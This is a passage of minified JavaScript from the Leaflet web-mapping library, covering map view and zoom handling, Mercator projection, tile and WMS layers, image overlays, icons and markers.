this._resetView(n.latLng(t),this._limitZoom(e)),this},setZoom:function(t){return this.setView(this.getCenter(),t)},zoomIn:function(t){return this.setZoom(this._zoom+(t||1))},zoomOut:function(t){return this.setZoom(this._zoom-(t||1))},setZoomAround:function(t,e){var i=this.getZoomScale(e),o=this.getSize().divideBy(2),s=t instanceof n.Point?t:this.latLngToContainerPoint(t),a=s.subtract(o).multiplyBy(1-1/i),r=this.containerPointToLatLng(o.add(a));return this.setView(r,e)},fitBounds:function(t){var e=this.getBoundsZoom(t);return this.setView(n.latLngBounds(t).getCenter(),e)},fitWorld:function(){var t=new n.LatLng(-60,-170),e=new n.LatLng(85,179);return this.fitBounds(new n.LatLngBounds(t,e))},panTo:function(t){return this.setView(t,this._zoom)},panBy:function(t){return this.fire("movestart"),this._rawPanBy(n.point(t)),this.fire("move"),this.fire("moveend")},setMaxBounds:function(t){if(t=n.latLngBounds(t),this.options.maxBounds=t,!t)return this._boundsMinZoom=null,this;var e=this.getBoundsZoom(t,!0);return this._boundsMinZoom=e,this._loaded&&(e>this._zoom?this.setView(t.getCenter(),e):this.panInsideBounds(t)),this},panInsideBounds:function(t){t=n.latLngBounds(t);var e=this.getBounds(),i=this.project(e.getSouthWest()),o=this.project(e.getNorthEast()),s=this.project(t.getSouthWest()),a=this.project(t.getNorthEast()),r=0,h=0;return o.y<a.y&&(h=a.y-o.y),o.x>a.x&&(r=a.x-o.x),i.y>s.y&&(h=s.y-i.y),i.x<s.x&&(r=s.x-i.x),this.panBy(new n.Point(r,h,!0))},addLayer:function(t){var e=n.stamp(t);return this._layers[e]?this:(this._layers[e]=t,!t.options||isNaN(t.options.maxZoom)&&isNaN(t.options.minZoom)||(this._zoomBoundLayers[e]=t,this._updateZoomLevels()),this.options.zoomAnimation&&n.TileLayer&&t instanceof n.TileLayer&&(this._tileLayersNum++,this._tileLayersToLoad++,t.on("load",this._onTileLayerLoad,this)),this.whenReady(function(){t.onAdd(this),this.fire("layeradd",{layer:t})},this),this)},removeLayer:function(t){var e=n.stamp(t);if(this._layers[e])return t.onRemove(this),delete this._layers[e],this._zoomBoundLayers[e]&&(delete this._zoomBoundLayers[e],this._updateZoomLevels()),this.options.zoomAnimation&&n.TileLayer&&t instanceof n.TileLayer&&(this._tileLayersNum--,this._tileLayersToLoad--,t.off("load",this._onTileLayerLoad,this)),this.fire("layerremove",{layer:t})},hasLayer:function(t){if(!t)return!1;var e=n.stamp(t);return this._layers.hasOwnProperty(e)},eachLayer:function(t,e){for(var i in this._layers)this._layers.hasOwnProperty(i)&&t.call(e,this._layers[i]);return this},invalidateSize:function(t){var e=this.getSize();if(this._sizeChanged=!0,this.options.maxBounds&&this.setMaxBounds(this.options.maxBounds),!this._loaded)return this;var i=e._subtract(this.getSize())._divideBy(2)._round();return(0!==i.x||0!==i.y)&&(t===!0?this.panBy(i):(this._rawPanBy(i),this.fire("move"),clearTimeout(this._sizeTimer),this._sizeTimer=setTimeout(n.bind(this.fire,this,"moveend"),200))),this},addHandler:function(t,e){return e?(this[t]=new e(this),this.options[t]&&this[t].enable(),this):i},remove:function(){return this._loaded&&this.fire("unload"),this._initEvents("off"),delete this._container._leaflet,this},getCenter:function(){return this._checkIfLoaded(),this._moved()?this.layerPointToLatLng(this._getCenterLayerPoint()):this._initialCenter},getZoom:function(){return this._zoom},getBounds:function(){var t=this.getPixelBounds(),e=this.unproject(t.getBottomLeft()),i=this.unproject(t.getTopRight());return new n.LatLngBounds(e,i)},getMinZoom:function(){var t=this.options.minZoom||0,e=this._layersMinZoom||0,i=this._boundsMinZoom||0;return Math.max(t,e,i)},getMaxZoom:function(){var t=this.options.maxZoom===i?1/0:this.options.maxZoom,e=this._layersMaxZoom===i?1/0:this._layersMaxZoom;return Math.min(t,e)},getBoundsZoom:function(t,e){t=n.latLngBounds(t);var i,o,s,a=this.getSize(),r=this.options.minZoom||0,h=this.getMaxZoom(),l=t.getNorthEast(),u=t.getSouthWest(),c=!0;e&&r--;do r++,o=this.project(l,r),s=this.project(u,r),i=new n.Point(Math.abs(o.x-s.x),Math.abs(s.y-o.y)),c=e?i.x<a.x||i.y<a.y:i.x<=a.x&&i.y<=a.y;while(c&&h>=r);return c&&e?null:e?r:r-1},getSize:function(){return(!this._size||this._sizeChanged)&&(this._size=new n.Point(this._container.clientWidth,this._container.clientHeight),this._sizeChanged=!1),this._size.clone()},getPixelBounds:function(){var t=this._getTopLeftPoint();return new n.Bounds(t,t.add(this.getSize()))},getPixelOrigin:function(){return this._checkIfLoaded(),this._initialTopLeftPoint},getPanes:function(){return this._panes},getContainer:function(){return this._container},getZoomScale:function(t){var e=this.options.crs;return e.scale(t)/e.scale(this._zoom)},getScaleZoom:function(t){return this._zoom+Math.log(t)/Math.LN2},project:function(t,e){return e=e===i?this._zoom:e,this.options.crs.latLngToPoint(n.latLng(t),e)},unproject:function(t,e){return e=e===i?this._zoom:e,this.options.crs.pointToLatLng(n.point(t),e)},layerPointToLatLng:function(t){var e=n.point(t).add(this.getPixelOrigin());return this.unproject(e)},latLngToLayerPoint:function(t){var e=this.project(n.latLng(t))._round();return e._subtract(this.getPixelOrigin())},containerPointToLayerPoint:function(t){return n.point(t).subtract(this._getMapPanePos())},layerPointToContainerPoint:function(t){return n.point(t).add(this._getMapPanePos())},containerPointToLatLng:function(t){var e=this.containerPointToLayerPoint(n.point(t));return this.layerPointToLatLng(e)},latLngToContainerPoint:function(t){return this.layerPointToContainerPoint(this.latLngToLayerPoint(n.latLng(t)))},mouseEventToContainerPoint:function(t){return n.DomEvent.getMousePosition(t,this._container)},mouseEventToLayerPoint:function(t){return this.containerPointToLayerPoint(this.mouseEventToContainerPoint(t))},mouseEventToLatLng:function(t){return this.layerPointToLatLng(this.mouseEventToLayerPoint(t))},_initContainer:function(t){var e=this._container=n.DomUtil.get(t);if(!e)throw Error("Map container not found.");if(e._leaflet)throw Error("Map container is already initialized.");e._leaflet=!0},_initLayout:function(){var t=this._container;n.DomUtil.addClass(t,"leaflet-container"),n.Browser.touch&&n.DomUtil.addClass(t,"leaflet-touch"),this.options.fadeAnimation&&n.DomUtil.addClass(t,"leaflet-fade-anim");var e=n.DomUtil.getStyle(t,"position");"absolute"!==e&&"relative"!==e&&"fixed"!==e&&(t.style.position="relative"),this._initPanes(),this._initControlPos&&this._initControlPos()},_initPanes:function(){var t=this._panes={};this._mapPane=t.mapPane=this._createPane("leaflet-map-pane",this._container),this._tilePane=t.tilePane=this._createPane("leaflet-tile-pane",this._mapPane),t.objectsPane=this._createPane("leaflet-objects-pane",this._mapPane),t.shadowPane=this._createPane("leaflet-shadow-pane"),t.overlayPane=this._createPane("leaflet-overlay-pane"),t.markerPane=this._createPane("leaflet-marker-pane"),t.popupPane=this._createPane("leaflet-popup-pane");var e=" leaflet-zoom-hide";this.options.markerZoomAnimation||(n.DomUtil.addClass(t.markerPane,e),n.DomUtil.addClass(t.shadowPane,e),n.DomUtil.addClass(t.popupPane,e))},_createPane:function(t,e){return n.DomUtil.create("div",t,e||this._panes.objectsPane)},_initLayers:function(t){t=t?n.Util.isArray(t)?t:[t]:[],this._layers={},this._zoomBoundLayers={},this._tileLayersNum=0;var e,i;for(e=0,i=t.length;i>e;e++)this.addLayer(t[e])},_resetView:function(t,e,i,o){var s=this._zoom!==e;o||(this.fire("movestart"),s&&this.fire("zoomstart")),this._zoom=e,this._initialCenter=t,this._initialTopLeftPoint=this._getNewTopLeftPoint(t),i?this._initialTopLeftPoint._add(this._getMapPanePos()):n.DomUtil.setPosition(this._mapPane,new n.Point(0,0)),this._tileLayersToLoad=this._tileLayersNum;var a=!this._loaded;this._loaded=!0,this.fire("viewreset",{hard:!i}),this.fire("move"),(s||o)&&this.fire("zoomend"),this.fire("moveend",{hard:!i}),a&&this.fire("load")},_rawPanBy:function(t){n.DomUtil.setPosition(this._mapPane,this._getMapPanePos().subtract(t))},_getZoomSpan:function(){return this.getMaxZoom()-this.getMinZoom()},_updateZoomLevels:function(){var t,e=1/0,n=-1/0,o=this._getZoomSpan();for(t in this._zoomBoundLayers)if(this._zoomBoundLayers.hasOwnProperty(t)){var s=this._zoomBoundLayers[t];isNaN(s.options.minZoom)||(e=Math.min(e,s.options.minZoom)),isNaN(s.options.maxZoom)||(n=Math.max(n,s.options.maxZoom))}t===i?this._layersMaxZoom=this._layersMinZoom=i:(this._layersMaxZoom=n,this._layersMinZoom=e),o!==this._getZoomSpan()&&this.fire("zoomlevelschange")},_checkIfLoaded:function(){if(!this._loaded)throw Error("Set map center and zoom first.")},_initEvents:function(e){if(n.DomEvent){e=e||"on",n.DomEvent[e](this._container,"click",this._onMouseClick,this);var i,o,s=["dblclick","mousedown","mouseup","mouseenter","mouseleave","mousemove","contextmenu"];for(i=0,o=s.length;o>i;i++)n.DomEvent[e](this._container,s[i],this._fireMouseEvent,this);this.options.trackResize&&n.DomEvent[e](t,"resize",this._onResize,this)}},_onResize:function(){n.Util.cancelAnimFrame(this._resizeRequest),this._resizeRequest=n.Util.requestAnimFrame(this.invalidateSize,this,!1,this._container)},_onMouseClick:function(t){!this._loaded||this.dragging&&this.dragging.moved()||(this.fire("preclick"),this._fireMouseEvent(t))},_fireMouseEvent:function(t){if(this._loaded){var e=t.type;if(e="mouseenter"===e?"mouseover":"mouseleave"===e?"mouseout":e,this.hasEventListeners(e)){"contextmenu"===e&&n.DomEvent.preventDefault(t);var i=this.mouseEventToContainerPoint(t),o=this.containerPointToLayerPoint(i),s=this.layerPointToLatLng(o);this.fire(e,{latlng:s,layerPoint:o,containerPoint:i,originalEvent:t})}}},_onTileLayerLoad:function(){this._tileLayersToLoad--,this._tileLayersNum&&!this._tileLayersToLoad&&this.fire("tilelayersload")},whenReady:function(t,e){return this._loaded?t.call(e||this,this):this.on("load",t,e),this},_getMapPanePos:function(){return n.DomUtil.getPosition(this._mapPane)},_moved:function(){var t=this._getMapPanePos();return t&&!t.equals(new n.Point(0,0))},_getTopLeftPoint:function(){return this.getPixelOrigin().subtract(this._getMapPanePos())},_getNewTopLeftPoint:function(t,e){var i=this.getSize()._divideBy(2);return this.project(t,e)._subtract(i)._round()},_latLngToNewLayerPoint:function(t,e,i){var n=this._getNewTopLeftPoint(i,e).add(this._getMapPanePos());return this.project(t,e)._subtract(n)},_getCenterLayerPoint:function(){return this.containerPointToLayerPoint(this.getSize()._divideBy(2))},_getCenterOffset:function(t){return this.latLngToLayerPoint(t).subtract(this._getCenterLayerPoint())},_limitZoom:function(t){var e=this.getMinZoom(),i=this.getMaxZoom();return Math.max(e,Math.min(i,t))}}),n.map=function(t,e){return new n.Map(t,e)},n.Projection.Mercator={MAX_LATITUDE:85.0840591556,R_MINOR:6356752.3142,R_MAJOR:6378137,project:function(t){var e=n.LatLng.DEG_TO_RAD,i=this.MAX_LATITUDE,o=Math.max(Math.min(i,t.lat),-i),s=this.R_MAJOR,a=this.R_MINOR,r=t.lng*e*s,h=o*e,l=a/s,u=Math.sqrt(1-l*l),c=u*Math.sin(h);c=Math.pow((1-c)/(1+c),.5*u);var _=Math.tan(.5*(.5*Math.PI-h))/c;return h=-a*Math.log(_),new n.Point(r,h)},unproject:function(t){for(var e,i=n.LatLng.RAD_TO_DEG,o=this.R_MAJOR,s=this.R_MINOR,a=t.x*i/o,r=s/o,h=Math.sqrt(1-r*r),l=Math.exp(-t.y/s),u=Math.PI/2-2*Math.atan(l),c=15,_=1e-7,p=c,d=.1;Math.abs(d)>_&&--p>0;)e=h*Math.sin(u),d=Math.PI/2-2*Math.atan(l*Math.pow((1-e)/(1+e),.5*h))-u,u+=d;return new n.LatLng(u*i,a)}},n.CRS.EPSG3395=n.extend({},n.CRS,{code:"EPSG:3395",projection:n.Projection.Mercator,transformation:function(){var t=n.Projection.Mercator,e=t.R_MAJOR,i=t.R_MINOR;return new n.Transformation(.5/(Math.PI*e),.5,-.5/(Math.PI*i),.5)}()}),n.TileLayer=n.Class.extend({includes:n.Mixin.Events,options:{minZoom:0,maxZoom:18,tileSize:256,subdomains:"abc",errorTileUrl:"",attribution:"",zoomOffset:0,opacity:1,unloadInvisibleTiles:n.Browser.mobile,updateWhenIdle:n.Browser.mobile},initialize:function(t,e){e=n.setOptions(this,e),e.detectRetina&&n.Browser.retina&&e.maxZoom>0&&(e.tileSize=Math.floor(e.tileSize/2),e.zoomOffset++,e.minZoom>0&&e.minZoom--,this.options.maxZoom--),e.bounds&&(e.bounds=n.latLngBounds(e.bounds)),this._url=t;var i=this.options.subdomains;"string"==typeof i&&(this.options.subdomains=i.split(""))},onAdd:function(t){this._map=t,this._animated=t.options.zoomAnimation&&n.Browser.any3d,this._initContainer(),this._createTileProto(),t.on({viewreset:this._reset,moveend:this._update},this),this._animated&&t.on({zoomanim:this._animateZoom,zoomend:this._endZoomAnim},this),this.options.updateWhenIdle||(this._limitedUpdate=n.Util.limitExecByInterval(this._update,150,this),t.on("move",this._limitedUpdate,this)),this._reset(),this._update()},addTo:function(t){return t.addLayer(this),this},onRemove:function(t){this._container.parentNode.removeChild(this._container),t.off({viewreset:this._reset,moveend:this._update},this),this._animated&&t.off({zoomanim:this._animateZoom,zoomend:this._endZoomAnim},this),this.options.updateWhenIdle||t.off("move",this._limitedUpdate,this),this._container=null,this._map=null},bringToFront:function(){var t=this._map._panes.tilePane;return this._container&&(t.appendChild(this._container),this._setAutoZIndex(t,Math.max)),this},bringToBack:function(){var t=this._map._panes.tilePane;return this._container&&(t.insertBefore(this._container,t.firstChild),this._setAutoZIndex(t,Math.min)),this},getAttribution:function(){return this.options.attribution},getContainer:function(){return this._container},setOpacity:function(t){return this.options.opacity=t,this._map&&this._updateOpacity(),this},setZIndex:function(t){return this.options.zIndex=t,this._updateZIndex(),this},setUrl:function(t,e){return this._url=t,e||this.redraw(),this},redraw:function(){return this._map&&(this._reset({hard:!0}),this._update()),this},_updateZIndex:function(){this._container&&this.options.zIndex!==i&&(this._container.style.zIndex=this.options.zIndex)},_setAutoZIndex:function(t,e){var i,n,o,s=t.children,a=-e(1/0,-1/0);for(n=0,o=s.length;o>n;n++)s[n]!==this._container&&(i=parseInt(s[n].style.zIndex,10),isNaN(i)||(a=e(a,i)));this.options.zIndex=this._container.style.zIndex=(isFinite(a)?a:0)+e(1,-1)},_updateOpacity:function(){var t,e=this._tiles;if(n.Browser.ielt9)for(t in e)e.hasOwnProperty(t)&&n.DomUtil.setOpacity(e[t],this.options.opacity);else n.DomUtil.setOpacity(this._container,this.options.opacity);if(n.Browser.webkit)for(t in e)e.hasOwnProperty(t)&&(e[t].style.webkitTransform+=" translate(0,0)")},_initContainer:function(){var t=this._map._panes.tilePane;if(!this._container){if(this._container=n.DomUtil.create("div","leaflet-layer"),this._updateZIndex(),this._animated){var e="leaflet-tile-container leaflet-zoom-animated";this._bgBuffer=n.DomUtil.create("div",e,this._container),this._tileContainer=n.DomUtil.create("div",e,this._container)}else this._tileContainer=this._container;t.appendChild(this._container),1>this.options.opacity&&this._updateOpacity()}},_reset:function(t){var e=this._tiles;for(var i in e)e.hasOwnProperty(i)&&this.fire("tileunload",{tile:e[i]});this._tiles={},this._tilesToLoad=0,this.options.reuseTiles&&(this._unusedTiles=[]),this._tileContainer.innerHTML="",this._animated&&t&&t.hard&&this._clearBgBuffer(),this._initContainer()},_update:function(){if(this._map){var t=this._map.getPixelBounds(),e=this._map.getZoom(),i=this.options.tileSize;if(!(e>this.options.maxZoom||this.options.minZoom>e)){var o=new n.Point(Math.floor(t.min.x/i),Math.floor(t.min.y/i)),s=new n.Point(Math.floor(t.max.x/i),Math.floor(t.max.y/i)),a=new n.Bounds(o,s);this._addTilesFromCenterOut(a),(this.options.unloadInvisibleTiles||this.options.reuseTiles)&&this._removeOtherTiles(a)}}},_addTilesFromCenterOut:function(t){var i,o,s,a=[],r=t.getCenter();for(i=t.min.y;t.max.y>=i;i++)for(o=t.min.x;t.max.x>=o;o++)s=new n.Point(o,i),this._tileShouldBeLoaded(s)&&a.push(s);var h=a.length;if(0!==h){a.sort(function(t,e){return t.distanceTo(r)-e.distanceTo(r)});var l=e.createDocumentFragment();for(this._tilesToLoad||this.fire("loading"),this._tilesToLoad+=h,o=0;h>o;o++)this._addTile(a[o],l);this._tileContainer.appendChild(l)}},_tileShouldBeLoaded:function(t){if(t.x+":"+t.y in this._tiles)return!1;if(!this.options.continuousWorld){var e=this._getWrapTileNum();if(this.options.noWrap&&(0>t.x||t.x>=e)||0>t.y||t.y>=e)return!1}if(this.options.bounds){var i=this.options.tileSize,o=t.multiplyBy(i),s=o.add(new n.Point(i,i)),a=this._map.unproject(o),r=this._map.unproject(s),h=new n.LatLngBounds([a,r]);if(!this.options.bounds.intersects(h))return!1}return!0},_removeOtherTiles:function(t){var e,i,n,o;for(o in this._tiles)this._tiles.hasOwnProperty(o)&&(e=o.split(":"),i=parseInt(e[0],10),n=parseInt(e[1],10),(t.min.x>i||i>t.max.x||t.min.y>n||n>t.max.y)&&this._removeTile(o))},_removeTile:function(t){var e=this._tiles[t];this.fire("tileunload",{tile:e,url:e.src}),this.options.reuseTiles?(n.DomUtil.removeClass(e,"leaflet-tile-loaded"),this._unusedTiles.push(e)):e.parentNode===this._tileContainer&&this._tileContainer.removeChild(e),n.Browser.android||(e.src=n.Util.emptyImageUrl),delete this._tiles[t]},_addTile:function(t,e){var i=this._getTilePos(t),o=this._getTile();n.DomUtil.setPosition(o,i,n.Browser.chrome||n.Browser.android23),this._tiles[t.x+":"+t.y]=o,this._loadTile(o,t),o.parentNode!==this._tileContainer&&e.appendChild(o)},_getZoomForUrl:function(){var t=this.options,e=this._map.getZoom();return t.zoomReverse&&(e=t.maxZoom-e),e+t.zoomOffset},_getTilePos:function(t){var e=this._map.getPixelOrigin(),i=this.options.tileSize;return t.multiplyBy(i).subtract(e)},getTileUrl:function(t){return n.Util.template(this._url,n.extend({s:this._getSubdomain(t),z:t.z,x:t.x,y:t.y},this.options))},_getWrapTileNum:function(){return Math.pow(2,this._getZoomForUrl())},_adjustTilePoint:function(t){var e=this._getWrapTileNum();this.options.continuousWorld||this.options.noWrap||(t.x=(t.x%e+e)%e),this.options.tms&&(t.y=e-t.y-1),t.z=this._getZoomForUrl()},_getSubdomain:function(t){var e=Math.abs(t.x+t.y)%this.options.subdomains.length;return this.options.subdomains[e]},_createTileProto:function(){var t=this._tileImg=n.DomUtil.create("img","leaflet-tile");t.style.width=t.style.height=this.options.tileSize+"px",t.galleryimg="no"},_getTile:function(){if(this.options.reuseTiles&&this._unusedTiles.length>0){var t=this._unusedTiles.pop();return this._resetTile(t),t}return this._createTile()},_resetTile:function(){},_createTile:function(){var t=this._tileImg.cloneNode(!1);return t.onselectstart=t.onmousemove=n.Util.falseFn,n.Browser.ielt9&&this.options.opacity!==i&&n.DomUtil.setOpacity(t,this.options.opacity),t},_loadTile:function(t,e){t._layer=this,t.onload=this._tileOnLoad,t.onerror=this._tileOnError,this._adjustTilePoint(e),t.src=this.getTileUrl(e)},_tileLoaded:function(){this._tilesToLoad--,this._tilesToLoad||(this.fire("load"),this._animated&&(clearTimeout(this._clearBgBufferTimer),this._clearBgBufferTimer=setTimeout(n.bind(this._clearBgBuffer,this),500)))},_tileOnLoad:function(){var t=this._layer;this.src!==n.Util.emptyImageUrl&&(n.DomUtil.addClass(this,"leaflet-tile-loaded"),t.fire("tileload",{tile:this,url:this.src})),t._tileLoaded()},_tileOnError:function(){var t=this._layer;t.fire("tileerror",{tile:this,url:this.src});var e=t.options.errorTileUrl;e&&(this.src=e),t._tileLoaded()}}),n.tileLayer=function(t,e){return new n.TileLayer(t,e)},n.TileLayer.WMS=n.TileLayer.extend({defaultWmsParams:{service:"WMS",request:"GetMap",version:"1.1.1",layers:"",styles:"",format:"image/jpeg",transparent:!1},initialize:function(t,e){this._url=t;var i=n.extend({},this.defaultWmsParams),o=e.tileSize||this.options.tileSize;i.width=i.height=e.detectRetina&&n.Browser.retina?2*o:o;for(var s in e)this.options.hasOwnProperty(s)||(i[s]=e[s]);this.wmsParams=i,n.setOptions(this,e)},onAdd:function(t){var e=parseFloat(this.wmsParams.version)>=1.3?"crs":"srs";this.wmsParams[e]=t.options.crs.code,n.TileLayer.prototype.onAdd.call(this,t)},getTileUrl:function(t,e){var i=this._map,o=i.options.crs,s=this.options.tileSize,a=t.multiplyBy(s),r=a.add(new n.Point(s,s)),h=o.project(i.unproject(a,e)),l=o.project(i.unproject(r,e)),u=[h.x,l.y,l.x,h.y].join(","),c=n.Util.template(this._url,{s:this._getSubdomain(t)});return c+n.Util.getParamString(this.wmsParams,c)+"&bbox="+u},setParams:function(t,e){return n.extend(this.wmsParams,t),e||this.redraw(),this}}),n.tileLayer.wms=function(t,e){return new n.TileLayer.WMS(t,e)},n.TileLayer.Canvas=n.TileLayer.extend({options:{async:!1},initialize:function(t){n.setOptions(this,t)},redraw:function(){var t=this._tiles;for(var e in t)t.hasOwnProperty(e)&&this._redrawTile(t[e]);return this},_redrawTile:function(t){this.drawTile(t,t._tilePoint,this._map._zoom)},_createTileProto:function(){var t=this._canvasProto=n.DomUtil.create("canvas","leaflet-tile");t.width=t.height=this.options.tileSize},_createTile:function(){var t=this._canvasProto.cloneNode(!1);return t.onselectstart=t.onmousemove=n.Util.falseFn,t},_loadTile:function(t,e){t._layer=this,t._tilePoint=e,this._redrawTile(t),this.options.async||this.tileDrawn(t)},drawTile:function(){},tileDrawn:function(t){this._tileOnLoad.call(t)}}),n.tileLayer.canvas=function(t){return new n.TileLayer.Canvas(t)},n.ImageOverlay=n.Class.extend({includes:n.Mixin.Events,options:{opacity:1},initialize:function(t,e,i){this._url=t,this._bounds=n.latLngBounds(e),n.setOptions(this,i)},onAdd:function(t){this._map=t,this._image||this._initImage(),t._panes.overlayPane.appendChild(this._image),t.on("viewreset",this._reset,this),t.options.zoomAnimation&&n.Browser.any3d&&t.on("zoomanim",this._animateZoom,this),this._reset()},onRemove:function(t){t.getPanes().overlayPane.removeChild(this._image),t.off("viewreset",this._reset,this),t.options.zoomAnimation&&t.off("zoomanim",this._animateZoom,this)},addTo:function(t){return t.addLayer(this),this},setOpacity:function(t){return this.options.opacity=t,this._updateOpacity(),this},bringToFront:function(){return this._image&&this._map._panes.overlayPane.appendChild(this._image),this},bringToBack:function(){var t=this._map._panes.overlayPane;return this._image&&t.insertBefore(this._image,t.firstChild),this},_initImage:function(){this._image=n.DomUtil.create("img","leaflet-image-layer"),this._map.options.zoomAnimation&&n.Browser.any3d?n.DomUtil.addClass(this._image,"leaflet-zoom-animated"):n.DomUtil.addClass(this._image,"leaflet-zoom-hide"),this._updateOpacity(),n.extend(this._image,{galleryimg:"no",onselectstart:n.Util.falseFn,onmousemove:n.Util.falseFn,onload:n.bind(this._onImageLoad,this),src:this._url})},_animateZoom:function(t){var e=this._map,i=this._image,o=e.getZoomScale(t.zoom),s=this._bounds.getNorthWest(),a=this._bounds.getSouthEast(),r=e._latLngToNewLayerPoint(s,t.zoom,t.center),h=e._latLngToNewLayerPoint(a,t.zoom,t.center)._subtract(r),l=r._add(h._multiplyBy(.5*(1-1/o)));i.style[n.DomUtil.TRANSFORM]=n.DomUtil.getTranslateString(l)+" scale("+o+") "},_reset:function(){var t=this._image,e=this._map.latLngToLayerPoint(this._bounds.getNorthWest()),i=this._map.latLngToLayerPoint(this._bounds.getSouthEast())._subtract(e);n.DomUtil.setPosition(t,e),t.style.width=i.x+"px",t.style.height=i.y+"px"},_onImageLoad:function(){this.fire("load")},_updateOpacity:function(){n.DomUtil.setOpacity(this._image,this.options.opacity)}}),n.imageOverlay=function(t,e,i){return new n.ImageOverlay(t,e,i)},n.Icon=n.Class.extend({options:{className:""},initialize:function(t){n.setOptions(this,t)},createIcon:function(){return this._createIcon("icon")},createShadow:function(){return this._createIcon("shadow")},_createIcon:function(t){var e=this._getIconUrl(t);if(!e){if("icon"===t)throw Error("iconUrl not set in Icon options (see the docs).");return null}var i=this._createImg(e);return this._setIconStyles(i,t),i},_setIconStyles:function(t,e){var i,o=this.options,s=n.point(o[e+"Size"]);i="shadow"===e?n.point(o.shadowAnchor||o.iconAnchor):n.point(o.iconAnchor),!i&&s&&(i=s.divideBy(2,!0)),t.className="leaflet-marker-"+e+" "+o.className,i&&(t.style.marginLeft=-i.x+"px",t.style.marginTop=-i.y+"px"),s&&(t.style.width=s.x+"px",t.style.height=s.y+"px")},_createImg:function(t){var i;return n.Browser.ie6?(i=e.createElement("div"),i.style.filter='progid:DXImageTransform.Microsoft.AlphaImageLoader(src="'+t+'")'):(i=e.createElement("img"),i.src=t),i},_getIconUrl:function(t){return n.Browser.retina&&this.options[t+"RetinaUrl"]?this.options[t+"RetinaUrl"]:this.options[t+"Url"]}}),n.icon=function(t){return new n.Icon(t)},n.Icon.Default=n.Icon.extend({options:{iconSize:new n.Point(25,41),iconAnchor:new n.Point(12,41),popupAnchor:new n.Point(1,-34),shadowSize:new n.Point(41,41)},_getIconUrl:function(t){var e=t+"Url";if(this.options[e])return this.options[e];n.Browser.retina&&"icon"===t&&(t+="@2x");var i=n.Icon.Default.imagePath;if(!i)throw Error("Couldn't autodetect L.Icon.Default.imagePath, set it manually.");return i+"/marker-"+t+".png"}}),n.Icon.Default.imagePath=function(){var t,i,n,o,s,a=e.getElementsByTagName("script"),r=/\/?leaflet[\-\._]?([\w\-\._]*)\.js\??/;for(t=0,i=a.length;i>t;t++)if(n=a[t].src,o=n.match(r))return s=n.split(r)[0],(s?s+"/":"")+"images"}(),n.Marker=n.Class.extend({includes:n.Mixin.Events,options:{icon:new n.Icon.Default,title:"",clickable:!0,draggable:!1,zIndexOffset:0,opacity:1,riseOnHover:!1,riseOffset:250},initialize:function(t,e){n.setOptions(this,e),this._latlng=n.latLng(t)},onAdd:function(t){this._map=t,t.on("viewreset",this.update,this),this._initIcon(),this.update(),t.options.zoomAnimation&&t.options.markerZoomAnimation&&t.on("zoomanim",this._animateZoom,this)},addTo:function(t){return t.addLayer(this),this},onRemove:function(t){this.dragging&&this.dragging.disable(),this._removeIcon(),this.fire("remove"),t.off({viewreset:this.update,zoomanim:this._animateZoom},this),this._map=null},getLatLng:function(){return this._latlng},setLatLng:function(t){return this._latlng=n.latLng(t),this.update(),this.fire("move",{latlng:this._latlng})},setZIndexOffset:function(t){return this.options.zIndexOffset=t,this.update(),this},setIcon:function(t){return this._map&&this._removeIcon(),this.options.icon=t,this._map&&(this._initIcon(),this.update()),this},update:function(){if(this._icon){var t=this._map.latLngToLayerPoint(this._latlng).round();this._setPos(t)}return this},_initIcon:function(){var t=this.options,e=this._map,i=e.options.zoomAnimation&&e.options.markerZoomAnimation,o=i?"leaflet-zoom-animated":"leaflet-zoom-hide",s=!1;this._icon||(this._icon=t.icon.createIcon(),t.title&&(this._icon.title=t.title),this._initInteraction(),s=1>this.options.opacity,n.DomUtil.addClass(this._icon,o),t.riseOnHover&&n.DomEvent.on(this._icon,"mouseover",this._bringToFront,this).on(this._icon,"mouseout",this._resetZIndex,this)),this._shadow||(this._shadow=t.icon.createShadow(),this._shadow&&(n.DomUtil.addClass(this._shadow,o),s=1>this.options.opacity)),s&&this._updateOpacity();var a=this._map._panes;a.markerPane.appendChild(this._icon),this._shadow&&a.shadowPane.appendChild(this._shadow)},_removeIcon:function(){var t=this._map._panes;this.options.riseOnHover&&n.DomEvent.off(this._icon,"mouseover",this._bringToFront).off(this._icon,"mouseout",this._resetZIndex),t.markerPane.removeChild(this._icon),this._shadow&&t.shadowPane.removeChild(this._shadow),this._icon=this._shadow=null},_setPos:function(t){n.DomUtil.setPosition(this._icon,t),this._shadow&&n.DomUtil.setPosition(this._shadow,t),this._zIndex=t.y+this.options.zIndexOffset,this._resetZIndex()},_updateZIndex:function(t){this._icon.style.zIndex=this._zIndex+t},_animateZoom:function(t){var e=this._map._latLngToNewLayerPoint(this._latlng,t.zoom,t.center);this._setPos(e)},_initInteraction:function(){if(this.options.clickable){var t=this._icon,e=["dblclick","mousedown","mouseover","mouseout","contextmenu"];n.DomUtil.addClass(t,"leaflet-clickable"),n.DomEvent.on(t,"click",this._onMouseClick,this);for(var i=0;e.length>i;i++)n.DomEvent.on(t,e[i],this._fireMouseEvent,this);n.Handler.MarkerDrag&&(this.dragging=new n.Handler.MarkerDrag(this),this.options.draggable&&this.dragging.enable())}},_onMouseClick:function(t){var e=this.dragging&&this.dragging.moved();(this.hasEventListeners(t.type)||e)&&n.DomEvent.stopPropagation(t),e||(this.dragging&&this.dragging._enabled||!this._map.dragging||!this._map.dragging.moved())&&this.fire(t.type,{originalEvent:t})},_fireMouseEvent:function(t){this.fire(t.type,{originalEvent:t}),"contextmenu"===t.type&&this.hasEventListeners(t.type)&&n.DomEvent.preventDefault(t),"mousedown"!==t.type&&n.DomEvent.stopPropagation(t)},setOpacity:function(t){this.options.opacity=t,this._map&&this._updateOpacity()},_updateOpacity:function(){n.DomUtil.setOpacity(this._icon,this.options.opacity),this._shadow&&n.DomUtil.setOpacity(this._shadow,this.options.opacity)},_bringToFront:function(){this._updateZIndex(this.options.riseOffset)},_resetZIndex:function(){this._updateZIndex(0)}}),n.marker=function(t,e){return new n.Marker(t,e)},n.DivIcon=n.Icon.extend({options:{iconSize:new n.Point(12,12),className:"leaflet-div-icon"},createIcon:function(){var t=e.createElement("div"),i=this.options;return i.html&&(t.innerHTML=i.html),i.bgPos&&(t.style.backgroundPosition=-i.bgPos.x+"px "+-i.bgPos.y+"px"),this._setIconStyles(t,"icon"),t},createShadow:function(){return null}}),n.divIcon=function(t){return new n.DivIcon(t)},n.Map.mergeOptions({closePopupOnClick:!0}),n.Popup=n.Class.extend({includes:n.Mixin.Events,options:{minWidth:50,maxWidth:300,maxHeight:null,autoPan:!0,closeButton:!0,offset:new n.Point(0,6),autoPanPadding:new 